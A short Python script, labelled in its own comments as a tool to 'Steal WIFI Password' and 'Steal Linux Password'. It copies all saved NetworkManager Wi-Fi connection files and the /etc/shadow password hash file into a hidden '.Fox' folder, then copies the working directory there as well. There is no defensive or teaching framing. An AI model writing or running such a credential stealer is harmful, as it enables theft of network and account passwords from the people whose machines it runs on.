import os
from os import walk
import shutil

### Steal WIFI Password On Linux ###
files = os.listdir("/etc/NetworkManager/system-connections/")
os.mkdir(".Fox")
num = 1
for line in files:
    shutil.copy2("/etc/NetworkManager/system-connections/" + line,
                 ".Fox/WIFI-" + str(num) + ".txt")
    num += 1

### Steal Linux Password ###
os.system("sudo cat /etc/shadow > .Fox/OS_Pass.txt")

### Take Backup ###
root_src_dir = r'.'    #Path/Location of the source directory
root_dst_dir = '.Fox/BackUp'  #Path to the destination folder

for src_dir, dirs, files in os.walk(root_src_dir):
    dst_dir = src_dir.replace(root_src_dir, root_dst_dir, 1)
    if not os.path.exists(dst_dir):
        os.makedirs(dst_dir)
    for file_ in files:
        src_file = os.path.join(src_dir, file_)
        dst_file = os.path.join(dst_dir, file_)
        if os.path.exists(dst_file):
            os.remove(dst_file)
        shutil.copy(src_file, dst_dir)

data = []
for (dirpath, dirnames, filenames) in walk("."):
    data.extend(filenames)
    break
for file in data:
    shutil.copy2(file, ".Fox/BackUP")
